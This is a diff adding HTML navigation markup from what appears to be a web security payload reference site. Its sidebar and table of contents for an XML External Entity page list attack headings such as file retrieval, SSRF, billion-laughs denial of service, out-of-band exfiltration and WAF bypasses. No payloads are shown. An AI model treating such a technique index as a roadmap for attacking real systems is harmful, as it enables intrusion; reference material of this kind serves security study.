+    <li class="md-nav__item">
+      <a href="../SQL%20Injection/OracleSQL%20Injection/" class="md-nav__link">
+        Oracle SQL Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SQL%20Injection/PostgreSQL%20Injection/" class="md-nav__link">
+        PostgreSQL injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SQL%20Injection/SQLite%20Injection/" class="md-nav__link">
+        SQLite Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_43" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_43" id="__nav_43_label" tabindex="0">
+          Server Side Include Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_43_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_43">
+          <span class="md-nav__icon md-icon"></span>
+          Server Side Include Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Server%20Side%20Include%20Injection/" class="md-nav__link">
+        Server Side Include Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_44" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_44" id="__nav_44_label" tabindex="0">
+          Server Side Request Forgery
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_44_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_44">
+          <span class="md-nav__icon md-icon"></span>
+          Server Side Request Forgery
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Server%20Side%20Request%20Forgery/" class="md-nav__link">
+        Server-Side Request Forgery
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_45" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_45" id="__nav_45_label" tabindex="0">
+          Server Side Template Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_45_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_45">
+          <span class="md-nav__icon md-icon"></span>
+          Server Side Template Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Server%20Side%20Template%20Injection/" class="md-nav__link">
+        Server Side Template Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_46" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_46" id="__nav_46_label" tabindex="0">
+          Tabnabbing
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_46_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_46">
+          <span class="md-nav__icon md-icon"></span>
+          Tabnabbing
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Tabnabbing/" class="md-nav__link">
+        Tabnabbing
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_47" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_47" id="__nav_47_label" tabindex="0">
+          Type Juggling
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_47_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_47">
+          <span class="md-nav__icon md-icon"></span>
+          Type Juggling
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Type%20Juggling/" class="md-nav__link">
+        Type Juggling
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_48" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_48" id="__nav_48_label" tabindex="0">
+          Upload Insecure Files
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_48_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_48">
+          <span class="md-nav__icon md-icon"></span>
+          Upload Insecure Files
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Upload%20Insecure%20Files/" class="md-nav__link">
+        Upload Insecure Files
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_48_2" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_48_2" id="__nav_48_2_label" tabindex="0">
+          CVE Ffmpeg HLS
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_48_2_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_48_2">
+          <span class="md-nav__icon md-icon"></span>
+          CVE Ffmpeg HLS
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS/" class="md-nav__link">
+        FFmpeg HLS vulnerability
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_48_3" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_48_3" id="__nav_48_3_label" tabindex="0">
+          Configuration Apache .htaccess
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_48_3_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_48_3">
+          <span class="md-nav__icon md-icon"></span>
+          Configuration Apache .htaccess
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess/" class="md-nav__link">
+        .htaccess upload
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_48_4" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_48_4" id="__nav_48_4_label" tabindex="0">
+          Configuration Busybox httpd.conf
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_48_4_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_48_4">
+          <span class="md-nav__icon md-icon"></span>
+          Configuration Busybox httpd.conf
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Upload%20Insecure%20Files/Configuration%20Busybox%20httpd.conf/" class="md-nav__link">
+        Index
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_48_5" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_48_5" id="__nav_48_5_label" tabindex="0">
+          Configuration uwsgi.ini
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_48_5_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_48_5">
+          <span class="md-nav__icon md-icon"></span>
+          Configuration uwsgi.ini
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Upload%20Insecure%20Files/Configuration%20uwsgi.ini/" class="md-nav__link">
+        uWSGI configuration file
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_48_6" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_48_6" id="__nav_48_6_label" tabindex="0">
+          Extension Flash
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_48_6_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_48_6">
+          <span class="md-nav__icon md-icon"></span>
+          Extension Flash
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Upload%20Insecure%20Files/Extension%20Flash/" class="md-nav__link">
+        Index
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_48_7" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_48_7" id="__nav_48_7_label" tabindex="0">
+          Picture ImageMagick
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_48_7_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_48_7">
+          <span class="md-nav__icon md-icon"></span>
+          Picture ImageMagick
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Upload%20Insecure%20Files/Picture%20ImageMagick/" class="md-nav__link">
+        ImageMagick Exploits
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_48_8" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_48_8" id="__nav_48_8_label" tabindex="0">
+          Zip Slip
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_48_8_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_48_8">
+          <span class="md-nav__icon md-icon"></span>
+          Zip Slip
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Upload%20Insecure%20Files/Zip%20Slip/" class="md-nav__link">
+        Zip Slip
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_49" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_49" id="__nav_49_label" tabindex="0">
+          Web Cache Deception
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_49_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_49">
+          <span class="md-nav__icon md-icon"></span>
+          Web Cache Deception
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Web%20Cache%20Deception/" class="md-nav__link">
+        Web Cache Deception
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_50" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_50" id="__nav_50_label" tabindex="0">
+          Web Sockets
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_50_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_50">
+          <span class="md-nav__icon md-icon"></span>
+          Web Sockets
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Web%20Sockets/" class="md-nav__link">
+        Web Sockets
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_51" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_51" id="__nav_51_label" tabindex="0">
+          XPATH Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_51_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_51">
+          <span class="md-nav__icon md-icon"></span>
+          XPATH Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../XPATH%20Injection/" class="md-nav__link">
+        XPATH Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_52" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_52" id="__nav_52_label" tabindex="0">
+          XSLT Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_52_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_52">
+          <span class="md-nav__icon md-icon"></span>
+          XSLT Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../XSLT%20Injection/" class="md-nav__link">
+        XSLT Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_53" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_53" id="__nav_53_label" tabindex="0">
+          XSS Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_53_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_53">
+          <span class="md-nav__icon md-icon"></span>
+          XSS Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../XSS%20Injection/" class="md-nav__link">
+        Cross Site Scripting
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../XSS%20Injection/XSS%20in%20Angular/" class="md-nav__link">
+        XSS in Angular and AngularJS
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../XSS%20Injection/XSS%20with%20Relative%20Path%20Overwrite/" class="md-nav__link">
+        XSS with Relative Path Overwrite - IE 8/9 and lower
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_54" checked>
+      
+      
+      
+        <label class="md-nav__link" for="__nav_54" id="__nav_54_label" tabindex="0">
+          XXE Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_54_label" aria-expanded="true">
+        <label class="md-nav__title" for="__nav_54">
+          <span class="md-nav__icon md-icon"></span>
+          XXE Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          XML External Entity
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        XML External Entity
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#summary" class="md-nav__link">
+    Summary
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tools" class="md-nav__link">
+    Tools
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#labs" class="md-nav__link">
+    Labs
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#detect-the-vulnerability" class="md-nav__link">
+    Detect the vulnerability
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploiting-xxe-to-retrieve-files" class="md-nav__link">
+    Exploiting XXE to retrieve files
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploiting XXE to retrieve files">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#classic-xxe" class="md-nav__link">
+    Classic XXE
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#classic-xxe-base64-encoded" class="md-nav__link">
+    Classic XXE Base64 encoded
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#php-wrapper-inside-xxe" class="md-nav__link">
+    PHP Wrapper inside XXE
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xinclude-attacks" class="md-nav__link">
+    XInclude attacks
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploiting-xxe-to-perform-ssrf-attacks" class="md-nav__link">
+    Exploiting XXE to perform SSRF attacks
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploiting-xxe-to-perform-a-deny-of-service" class="md-nav__link">
+    Exploiting XXE to perform a deny of service
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploiting XXE to perform a deny of service">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#billion-laugh-attack" class="md-nav__link">
+    Billion Laugh Attack
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#yaml-attack" class="md-nav__link">
+    Yaml attack
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#parameters-laugh-attack" class="md-nav__link">
+    Parameters Laugh attack
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploiting-error-based-xxe" class="md-nav__link">
+    Exploiting Error Based XXE
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploiting Error Based XXE">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#error-based-using-local-dtd-file" class="md-nav__link">
+    Error Based - Using Local DTD File
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#error-based-using-remote-dtd" class="md-nav__link">
+    Error Based - Using Remote DTD
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploiting-blind-xxe-to-exfiltrate-data-out-of-band" class="md-nav__link">
+    Exploiting blind XXE to exfiltrate data out-of-band
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploiting blind XXE to exfiltrate data out-of-band">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#basic-blind-xxe" class="md-nav__link">
+    Basic Blind XXE
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xxe-oob-attack-yunusov-2013" class="md-nav__link">
+    XXE OOB Attack (Yunusov, 2013)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xxe-oob-with-dtd-and-php-filter" class="md-nav__link">
+    XXE OOB with DTD and PHP filter
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xxe-oob-with-apache-karaf" class="md-nav__link">
+    XXE OOB with Apache Karaf
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xxe-with-local-dtd" class="md-nav__link">
+    XXE with local DTD
+  </a>
+  
+    <nav class="md-nav" aria-label="XXE with local DTD">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#cisco-webex" class="md-nav__link">
+    Cisco WebEx
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#citrix-xenmobile-server" class="md-nav__link">
+    Citrix XenMobile Server
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#waf-bypasses" class="md-nav__link">
+    WAF Bypasses
+  </a>
+  
+    <nav class="md-nav" aria-label="WAF Bypasses">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#bypass-via-character-encoding" class="md-nav__link">
+    Bypass via character encoding
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xxe-in-java" class="md-nav__link">
+    XXE in Java
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xxe-in-exotic-files" class="md-nav__link">
+    XXE in exotic files
+  </a>
+  
+    <nav class="md-nav" aria-label="XXE in exotic files">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#xxe-inside-svg" class="md-nav__link">
+    XXE inside SVG
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xxe-inside-soap" class="md-nav__link">
+    XXE inside SOAP
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xxe-inside-docx-file" class="md-nav__link">
+    XXE inside DOCX file
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xxe-inside-xlsx-file" class="md-nav__link">
+    XXE inside XLSX file
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xxe-inside-dtd-file" class="md-nav__link">
+    XXE inside DTD file
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#windows-local-dtd-and-side-channel-leak-to-disclose-http-responsefile-contents" class="md-nav__link">
+    Windows Local DTD and Side Channel Leak to disclose HTTP response/file contents
+  </a>
+  
+    <nav class="md-nav" aria-label="Windows Local DTD and Side Channel Leak to disclose HTTP response/file contents">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#disclose-local-file" class="md-nav__link">
+    Disclose local file
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#disclose-http-response" class="md-nav__link">
+    Disclose HTTP Response:
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    References
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_55" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_55" id="__nav_55_label" tabindex="0">
+           LEARNING AND SOCIALS
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_55_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_55">
+          <span class="md-nav__icon md-icon"></span>
+           LEARNING AND SOCIALS
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../_LEARNING_AND_SOCIALS/BOOKS/" class="md-nav__link">
+        Books
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../_LEARNING_AND_SOCIALS/TWITTER/" class="md-nav__link">
+        Twitter
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../_LEARNING_AND_SOCIALS/YOUTUBE/" class="md-nav__link">
+        Youtube
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_56" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_56" id="__nav_56_label" tabindex="0">
+           template vuln
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_56_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_56">
+          <span class="md-nav__icon md-icon"></span>
+           template vuln
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../_template_vuln/" class="md-nav__link">
+        Vulnerability Title
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#summary" class="md-nav__link">
+    Summary
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tools" class="md-nav__link">
+    Tools
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#labs" class="md-nav__link">
+    Labs
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#detect-the-vulnerability" class="md-nav__link">
+    Detect the vulnerability
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploiting-xxe-to-retrieve-files" class="md-nav__link">
+    Exploiting XXE to retrieve files
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploiting XXE to retrieve files">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#classic-xxe" class="md-nav__link">
+    Classic XXE
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#classic-xxe-base64-encoded" class="md-nav__link">
+    Classic XXE Base64 encoded
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#php-wrapper-inside-xxe" class="md-nav__link">
+    PHP Wrapper inside XXE
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xinclude-attacks" class="md-nav__link">
+    XInclude attacks
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploiting-xxe-to-perform-ssrf-attacks" class="md-nav__link">
+    Exploiting XXE to perform SSRF attacks
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploiting-xxe-to-perform-a-deny-of-service" class="md-nav__link">
+    Exploiting XXE to perform a deny of service
